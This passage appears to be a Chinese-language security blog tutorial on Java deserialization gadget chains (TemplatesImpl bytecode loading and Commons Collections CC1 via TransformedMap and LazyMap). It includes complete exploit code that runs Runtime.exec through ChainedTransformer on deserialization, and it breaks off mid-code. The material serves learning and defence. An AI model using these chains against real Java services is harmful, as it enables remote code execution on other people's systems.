<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClass</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;Hello.class&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Hello&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="TemplatesImpl">TemplatesImpl</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">         TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">             <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">            <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">            <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>重写了defineClass，同时Java中默认情况下，如果一个 方法没有显式声明作用域，其作用域为default。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;HelloTemplatesImpl.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CC1">CC1</h2>
<p>CC1的链子一共是两条，一条使用的是LazyMap，一条使用的是TransformedMap，我们最终的目的是触发上面分析之后的ChainedTransformer的transform方法</p>
<p><strong>限制条件，jdk版本在Oracle JDK 8u71以前，在8u71开始，AnnotationInvocationHandler的readObjet发生变化</strong></p>
<p>参考链接：p神安全漫谈</p>
<p><a href="https://ch1e.gitee.io/2022/02/21/cc1/">https://ch1e.gitee.io/2022/02/21/cc1/</a></p>
<h3 id="TransformedMap">TransformedMap</h3>
<p>构造函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>但是protected</p>
<p>所以需要找到内部的调用函数，类似于getruntime</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>能够触发transform的地方在</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其父类AbstractInputCheckedMapDecorator中的MapEntry方法会调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = <span class="built_in">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因为其重写了setValue，然后调用parent的checkSetValue，那么只要传入的东西符合即可，稍微测试一下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer [] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;CC1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry entry: transformedMap.entrySet() )&#123;</span><br><span class="line">            entry.setValue(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>成功触发</p>
<p>那么就需要寻找调用setValue的readObject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            annotationType = AnnotationType.getInstance(type);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">        <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">            Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">            <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                      value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    memberValue.setValue(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                            value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                annotationType.members().get(name)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>AnnotationInvocationHandler下的readObject调用了setValue，并且跟我们测试的地方处理方式相似</p>
<p>那么整个的调用链子就出来了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler-&gt;readObject-&gt;setValue</span><br><span class="line">	AbstractInputCheckedMapDecorator-&gt;MapEntry-&gt;setValue-&gt;checkSetValue</span><br><span class="line">		TransformedMap-&gt;checkSetValue-&gt;transform</span><br></pre></td></tr></table></figure>
<p>通过AnnotationInvocationHandler的readObject调用setValue，然后触发AbstractInputCheckedMapDecorator-&gt;MapEntry-&gt;setValue-&gt;checkSetValue,最终触发transform形成链子</p>
<p>然后需要注意的是，进入这个循环需要满足memberType != null，那么跟到本质是在AnnotationType下面需要对其进行初始化，传入的是一个标签，并且需要特定的数值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">AnnotationType</span><span class="params">(<span class="keyword">final</span> Class&lt;? extends Annotation&gt; var1)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!var1.isAnnotation()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Not an annotation type&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Method[] var2 = (Method[])AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Method[]&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Method[] run() &#123;</span><br><span class="line">                    <span class="keyword">return</span> var1.getDeclaredMethods();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="built_in">this</span>.memberTypes = <span class="keyword">new</span> <span class="title class_">HashMap</span>(var2.length + <span class="number">1</span>, <span class="number">1.0F</span>);</span><br><span class="line">            <span class="built_in">this</span>.memberDefaults = <span class="keyword">new</span> <span class="title class_">HashMap</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="built_in">this</span>.members = <span class="keyword">new</span> <span class="title class_">HashMap</span>(var2.length + <span class="number">1</span>, <span class="number">1.0F</span>);</span><br><span class="line">            Method[] var3 = var2;</span><br><span class="line">            <span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> var2.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="number">0</span>; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">var6</span> <span class="operator">=</span> var3[var5];</span><br><span class="line">                <span class="keyword">if</span> (var6.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(var6 + <span class="string">&quot; has params&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">var7</span> <span class="operator">=</span> var6.getName();</span><br><span class="line">                <span class="type">Class</span> <span class="variable">var8</span> <span class="operator">=</span> var6.getReturnType();</span><br><span class="line">                <span class="built_in">this</span>.memberTypes.put(var7, invocationHandlerReturnType(var8));</span><br><span class="line">                <span class="built_in">this</span>.members.put(var7, var6);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">var9</span> <span class="operator">=</span> var6.getDefaultValue();</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.memberDefaults.put(var7, var9);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var1 != Retention.class &amp;&amp; var1 != Inherited.class) &#123;</span><br><span class="line">                <span class="type">JavaLangAccess</span> <span class="variable">var10</span> <span class="operator">=</span> SharedSecrets.getJavaLangAccess();</span><br><span class="line">                <span class="type">Map</span> <span class="variable">var11</span> <span class="operator">=</span> AnnotationParser.parseSelectAnnotations(var10.getRawClassAnnotations(var1), var10.getConstantPool(var1), var1, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Retention.class, Inherited.class&#125;);</span><br><span class="line">                <span class="type">Retention</span> <span class="variable">var12</span> <span class="operator">=</span> (Retention)var11.get(Retention.class);</span><br><span class="line">                <span class="built_in">this</span>.retention = var12 == <span class="literal">null</span> ? RetentionPolicy.CLASS : var12.value();</span><br><span class="line">                <span class="built_in">this</span>.inherited = var11.containsKey(Inherited.class);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.retention = RetentionPolicy.RUNTIME;</span><br><span class="line">                <span class="built_in">this</span>.inherited = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中需要有Retention标签，当然Target也行</p>
<p>最终exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span>  Exception &#123;</span><br><span class="line">        Transformer [] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;CC1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotation</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconst</span> <span class="operator">=</span> annotation.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconst.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> annotationconst.newInstance(Target.class, transformedMap);</span><br><span class="line"><span class="comment">//        Object annotationInvocationHandler = annotationconst.newInstance(Retention.class, transformedMap);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(annotationInvocationHandler);</span></span><br><span class="line"></span><br><span class="line">        unserialize(<span class="string">&quot;CC1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oip.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="LazyMap">LazyMap</h3>
<p>整个的流程不变，但是触发的方式使用的是LazyMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其中存在get方法触发transform方法，然后AnnotationInvocationHandler中的invoke方法调用了get方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">member</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle Object and Annotation methods</span></span><br><span class="line">        <span class="keyword">if</span> (member.equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; paramTypes.length == <span class="number">1</span> &amp;&amp;</span><br><span class="line">            paramTypes[<span class="number">0</span>] == Object.class)</span><br><span class="line">            <span class="keyword">return</span> equalsImpl(args[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (paramTypes.length != <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(<span class="string">&quot;Too many parameters for an annotation method&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(member) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;toString&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;hashCode&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> hashCodeImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;annotationType&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> type;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Handle annotation member accessors</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> memberValues.get(member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IncompleteAnnotationException</span>(type, member);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">            <span class="keyword">throw</span> ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="number">0</span>)</span><br><span class="line">            result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>然后通过动态代理触发（只要将AnnotationInvocationHandler当作委托，那么只要调用代理类，必然会触发委托类的invoke）</p>
<p>链子如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Proxy-&gt;AnnotationInvocationHandler-&gt;invoke</span><br><span class="line">	AnnotationInvocationHandler-&gt;invoke-&gt;get</span><br><span class="line">		LazyMap-&gt;get-&gt;transform</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer [] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title 